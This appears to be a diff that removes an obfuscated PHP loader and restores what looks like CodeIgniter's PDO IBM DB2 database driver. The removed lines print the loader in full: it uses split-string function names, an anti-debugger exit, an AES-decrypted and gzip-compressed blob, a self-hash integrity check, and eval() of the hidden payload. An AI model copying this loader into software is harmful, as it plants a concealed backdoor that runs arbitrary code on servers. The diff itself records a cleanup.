@@ -1,28 +1,216 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ji3n0c18=('bas'.'e64'.'_de'.'cod'.'e');
-$_x4qfy27z=('gzu'.'nco'.'mpr'.'ess');
-$_kl27cca9=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_es5b7a5u='544OiO9pyso=';
-$_qm6nadd6='QYOGE/dh';
-$_slsbhy7o='I2uH/W3n';
-$_hkklvyba='vNEhc7BH';
-$_c6hzzyez='fJXF4Wl5';
-$_ga5dgdu4='UBduUw==';
-$_rds4f3ao='uWnwTrPK';
-$_mi2o4ses='oiC9wFCP';
-$_abui4wqo=$_ji3n0c18($_c6hzzyez.$_qm6nadd6.$_hkklvyba.$_slsbhy7o.$_es5b7a5u);
-$_vdmaf50v=$_ji3n0c18($_rds4f3ao.$_mi2o4ses.$_ga5dgdu4);
-$_rndxce7f=$_ji3n0c18('EsNXuZmoUYpiVl4f7MHeRGhiysPBxF3UaZU4lfwEkVrtWho1rOWziDc8TZZNl8up4k66qQ7yJ72YkWRlaw0PSxm95uNGi6s2aQs43ZB5cFqMCq0ozzEtnpR/88cGQRUaLNFfdJKbFlmB4md5ypaJGFYc1vogC1vI/ChkfwmIIcQ/PCcWxmuPAyPfaxZLVOs8F3YECGBIGSThj+OT8zORLjvrXPP/zW21a9UXevFb9zG/SiO51OGTH2BHI5PxH39JS+UJJWGxdzxpFdGA8zURZI8DO/0m+kp/IQT+TvzHydyMuZAfhfiaB62DtleTbDTg7gzotV0vl9eCUTrYkhus1TCnzYInwI9TwkBA608HdfTFOmG1r7aOZrBVQlx+kqS03xfLFR04zbgZtrQ9hHpiKooUiTuCvBCViLDB6eaIakKWFFZ3FLGiNYTHbdin2OdqNWynXB489oKDpxcEH3ZICkWAGmXCJLmri/9ZbsVhHDklMhHWPave+4KOlXHVOT7YSxJE9cZRJgO4KgRchlNnxNBrtZqK4ajkUmqoz+FftLhT7nUfkg3xfE/cnZbFmZHvhpjb9qWdkPM3jlDqfgsZbV7LcmfCxkMJyleAMnluehLEkbofQVfK4cNYQ7KPTv4XatmclbDusL0uLzIAIyo//69iqVYCaXUlSiLT6PbvzZVmEM/eUM/OZzPLBTNqDcUqmMFazzdWV9vAsxlO8q2AAtueBPI7LIvSWin2scDsawscyxfC/g9jEp7doKaZWWa09jZf3BTUlgTtDhLWGUO4/K6m2FY8bK0zL2MosjZwmdVVZa7AvSKdIlOtfz5NQ8tG3vgG4bvRP7Kxu3N0hkRngu6p5kak3ymSt71L51Wojrdl/LkLUOsQbuMWRwt8i1L+lrSZVSaonWrirMHT3WQvh6nGxs7xpgx+aCRPEIjM1VkLb/0CewaX31r0oiJI4ULPaxqbK9bZ5W1qNigRXHMvM/bQw0d4S6VddBXb8LDuA/cfV4wT4scixU2iI1WgblU3kLE2qAhTekODaddBHeXVDUGfEDd/tID6+/PpWZ08DW0TWRM+39gklQPWjoqaPxurSdQzvLW+hHLd18uXhqPXFjuQ4M8gR9SDmC+Hbr3DMs2KvdqrDB0hvSXhWz2bNXDnnr83tP51yuRRNAP2vPcgmegBdo/Wrl3TkaFlyxSgnUL/xq/KKZRe/2Bxm8GxUH46pfKfr7EFAHqoAxWrDaU1mJLdPbFG1uxS9pMqE+IoCRKwWj76RyMZjQQ5+UzxIOBjDyIgtwojY53+tUXpWUfb9MraQd0yasKrdVIV0OYFTzs=');
-$_bl2h9uj4=$_kl27cca9($_rndxce7f,'aes-256-cbc',$_abui4wqo,OPENSSL_RAW_DATA,$_vdmaf50v);
-if($_bl2h9uj4===false){exit;}
-$_mvln7bwh=$_x4qfy27z($_bl2h9uj4);
-if($_mvln7bwh===false){exit;}
-$_yonbhnjr='5de478ac1d4ff48826397bf0ccb348517e0b15c4b87f921a776fba27d0dba1f2';
-$_fgaxbq14=@file_get_contents(__FILE__);
-if($_fgaxbq14!==false){
-$_u44gkswv=str_replace($_yonbhnjr,"0000000000000000000000000000000000000000000000000000000000000000",$_fgaxbq14);
-$_k44m3y09=hash("sha256",$_u44gkswv);
-if($_k44m3y09!==$_yonbhnjr){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_ibm_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'ibm';
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'ibm:';
+
+if (empty($this->hostname) && empty($this->HOSTNAME) && empty($this->port) && empty($this->PORT))
+{
+if (isset($this->DSN))
+{
+$this->dsn .= 'DSN='.$this->DSN;
 }
-eval($_mvln7bwh);
+elseif ( ! empty($this->database))
+{
+$this->dsn .= 'DSN='.$this->database;
+}
+return;
+}
+$this->dsn .= 'DRIVER='.(isset($this->DRIVER) ? '{'.$this->DRIVER.'}' : '{IBM DB2 ODBC DRIVER}').';';
+if (isset($this->DATABASE))
+{
+$this->dsn .= 'DATABASE='.$this->DATABASE.';';
+}
+elseif ( ! empty($this->database))
+{
+$this->dsn .= 'DATABASE='.$this->database.';';
+}
+if (isset($this->HOSTNAME))
+{
+$this->dsn .= 'HOSTNAME='.$this->HOSTNAME.';';
+}
+else
+{
+$this->dsn .= 'HOSTNAME='.(empty($this->hostname) ? '127.0.0.1;' : $this->hostname.';');
+}
+if (isset($this->PORT))
+{
+$this->dsn .= 'PORT='.$this->port.';';
+}
+elseif ( ! empty($this->port))
+{
+$this->dsn .= ';PORT='.$this->port.';';
+}
+$this->dsn .= 'PROTOCOL='.(isset($this->PROTOCOL) ? $this->PROTOCOL.';' : 'TCPIP;');
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "tabname" FROM "syscat"."tables"
+			WHERE "type" = \'T\' AND LOWER("tabschema") = '.$this->escape(strtolower($this->database));
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+$sql .= ' AND "tabname" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SELECT "colname" FROM "syscat"."columns"
+			WHERE LOWER("tabschema") = '.$this->escape(strtolower($this->database)).'
+				AND LOWER("tabname") = '.$this->escape(strtolower($table));
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+$sql = 'SELECT "colname" AS "name", "typename" AS "type", "default" AS "default", "length" AS "max_length",
+				CASE "keyseq" WHEN NULL THEN 0 ELSE 1 END AS "primary_key"
+			FROM "syscat"."columns"
+			WHERE LOWER("tabschema") = '.$this->escape(strtolower($this->database)).'
+				AND LOWER("tabname") = '.$this->escape(strtolower($table)).'
+			ORDER BY "colno"';
+return (($query = $this->query($sql)) !== FALSE)
+? $query->result_object()
+: FALSE;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+$this->qb_orderby = array();
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+$sql .= ' FETCH FIRST '.($this->qb_limit + $this->qb_offset).' ROWS ONLY';
+return ($this->qb_offset)
+? 'SELECT * FROM ('.$sql.') WHERE rownum > '.$this->qb_offset
+: $sql;
+}
+}
